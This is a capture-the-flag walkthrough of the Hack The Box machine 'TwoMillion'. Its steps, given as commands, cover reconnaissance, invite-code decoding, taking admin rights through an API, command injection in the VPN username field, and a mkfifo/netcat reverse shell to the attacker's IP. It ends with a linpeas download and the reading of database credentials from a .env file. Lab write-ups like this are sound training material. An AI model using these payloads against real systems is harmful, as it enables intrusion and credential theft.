### TwoMillion-HackTheBox🏴󠁧󠁢󠁥󠁮󠁧󠁿

**First we are going to prove the conexión with a ping**
```bash
ping -c3 10.129.229.66
```

<img width="959" height="272" alt="image" src="https://github.com/user-attachments/assets/78d7498f-3a61-41a8-aa18-96e209ce3d04" />



**We need to do a nmap for check how many ports are open.**
```bash
 mkdir -p nmap
sudo nmap -sC -sV -oA nmap/twomillion -p 22,80 10.129.229.66
```
<img width="968" height="331" alt="image" src="https://github.com/user-attachments/assets/e5510005-d4fb-43b1-a4c9-51eb178f3978" />


**First we need to add for the hosts the website.**
```bash
sudo nano /etc/hosts
```

<img width="973" height="263" alt="image" src="https://github.com/user-attachments/assets/2249b130-f71d-40ad-a12d-17b0cf1cb546" />


**Now we check on the website for the js file.**


<img width="956" height="928" alt="image" src="https://github.com/user-attachments/assets/b097e8a6-2863-452d-95ec-ed1270c54214" />


#### 3. What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.

**We check on the dettails of the webside(debuger).**

<img width="635" height="452" alt="image" src="https://github.com/user-attachments/assets/a9c84cdb-cd64-4a4f-bf70-50074ee664e2" />


**When we make a post request we get this message.**

```bash
# curl -X POST 'http://2million.htb/api/v1/invite/how/to/generate'   
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."} 

```


**It says it's encoded in rot13, so we'll go to that website and read it.**

<img width="955" height="901" alt="image" src="https://github.com/user-attachments/assets/04486e42-d259-4da7-bd87-862f93cf267c" />


**When we make the post we will see that it is in base64**
```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```
<img width="958" height="82" alt="image" src="https://github.com/user-attachments/assets/4e4a451d-da8c-4ccb-b55b-17cc0dd232c8" />


**We will proceed to encode it in base64**

<img width="970" height="62" alt="image" src="https://github.com/user-attachments/assets/f354c87d-3acd-4bd6-ad4d-d393ed42b23f" />


<img width="971" height="96" alt="image" src="https://github.com/user-attachments/assets/a26bac51-899b-4c9e-a03f-d7f3cbe25897" />


**We enter it in the login**

<img width="960" height="812" alt="image" src="https://github.com/user-attachments/assets/8f6f6c37-7652-46a5-8e89-51cf2058d1eb" />


**we register and log in**

<img width="946" height="1015" alt="image" src="https://github.com/user-attachments/assets/c2da2280-1c76-491a-ac5d-142e7b9ab6ea" />


**Once logged in, we can download a VPN.**

<img width="948" height="990" alt="image" src="https://github.com/user-attachments/assets/1859bace-5516-45ab-b0f9-dac597697c86" />


**From what we can see, we will need to find our session token.**

<img width="960" height="712" alt="image" src="https://github.com/user-attachments/assets/47ef48e6-95d5-4291-be48-f3899b88dffe" />


**We will use the cookie to search in the script**

<img width="971" height="607" alt="image" src="https://github.com/user-attachments/assets/99e73ffc-f236-40d5-a148-c0e2d36b9bad" />


**We're going to change the privileges to administrator**
```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=898jdovoo7sir8u9tn9fr4v8m7' -H 'Content-Type: application/json' -d '{"email":"adri@gmail.com", "is_admin":1}'
```

<img width="969" height="84" alt="image" src="https://github.com/user-attachments/assets/022b60f9-d378-4f28-9b54-bc01784a888f" />


**Let's verify that we are administrators**
```bash
curl -s http://2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=898jdovoo7sir8u9tn9fr4v8
m7'
```

<img width="960" height="104" alt="image" src="https://github.com/user-attachments/assets/a06ba427-ace8-4e5a-941f-100b4709814d" />


**As administrator users, we can generate a VPN by sending a POST request to http://2million.htb/api/v1/admin/vpn/generate**
```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=898jdovoo7sir8u9tn9fr4v8m7'  -H 'Content-Type: application/json' -d '{"username":"adrirg86"}'
```

<img width="971" height="1057" alt="image" src="https://github.com/user-attachments/assets/53057a4c-0618-471a-a6de-c8e518fb93bb" />


**Let's check if we can execute commands**
```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=898jdovoo7sir8u9tn9fr4v8m7' -H 'Content-Type: application/json' -d '{"username":"adrirg86 ; whoami #"}'
```

<img width="960" height="84" alt="image" src="https://github.com/user-attachments/assets/5791e6a3-94e5-4829-882c-ef1c2babc77b" />


**We will look at our IP address and check the ICMP signals from the machine.**
```bash
 hostname -I
sudo tcpdump -i tun0 icmp
```

<img width="976" height="437" alt="image" src="https://github.com/user-attachments/assets/ae029784-9a95-48b6-a169-d4dff240e83d" />


**Using another terminal, we will need to simulate a ping since we have access to the commands**
```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=898jdovoo7sir8u9tn9fr4v8m7' -H 'Content-Type: application/json' -d '{"username":"adrirg86 ; ping 10.10.15.98 #"}'
```

<img width="973" height="636" alt="image" src="https://github.com/user-attachments/assets/e2399440-ffcf-4b2a-9bac-07a7eb9cc16b" />


**From the first terminal, execute a command to listen to the noise on port 443.**
```bash
nc -nlvp 443
```

<img width="866" height="42" alt="image" src="https://github.com/user-attachments/assets/58147aa6-5cfb-4f5d-a633-d068ef5235a6" />


**In the other terminal, we must enter this command to be able to take the reverse shell from the terminal in which the noise 443 is being heard**
```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=898jdovoo7sir8u9tn9fr4v8m7' -H 'Content-Type: application/json' -d '{"username":"adrirg86 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.98 443>/tmp/f #"}'
```

<img width="962" height="231" alt="image" src="https://github.com/user-attachments/assets/d0a98c4e-d2d7-4b9d-8476-b7dda9effafa" />


<img width="975" height="135" alt="image" src="https://github.com/user-attachments/assets/a8e9315e-8c14-4335-a1b4-75dd635ea640" />


**We will perform the treatment on the TTY**
```bash
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]

```

<img width="971" height="162" alt="image" src="https://github.com/user-attachments/assets/ef01b95c-b672-4433-8f4f-60b4f3a7b2a9" />


**We'll start escalating privileges, first numbering the operating system using linpeas.sh, and for that we'll pass it from git**
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

<img width="971" height="235" alt="image" src="https://github.com/user-attachments/assets/cc7eb7e1-89d4-4aec-9d22-4ab7436a5e2c" />


**We run the script to listen on the port**
```bash
# python -m http.server 80
```

<img width="968" height="64" alt="image" src="https://github.com/user-attachments/assets/1c6baad9-56dc-4bce-8475-bbd6d9703c1e" />


**Let's download the sh**
```bash
cd /tmp
wget http://10.10.15.98/linpeas.sh
chmod +x linpeas.sh
```
<img width="964" height="537" alt="image" src="https://github.com/user-attachments/assets/f5945a6d-ddb9-41be-a5f6-f3b512890d77" />


**We execute**
```bash
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 root root 87 Jun  2  2023 /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```


**We will log in as admin**
```bash
su admin
```

<img width="962" height="116" alt="image" src="https://github.com/user-attachments/assets/5dde9b41-31d0-4b22-93c8-05706aa7a139" />





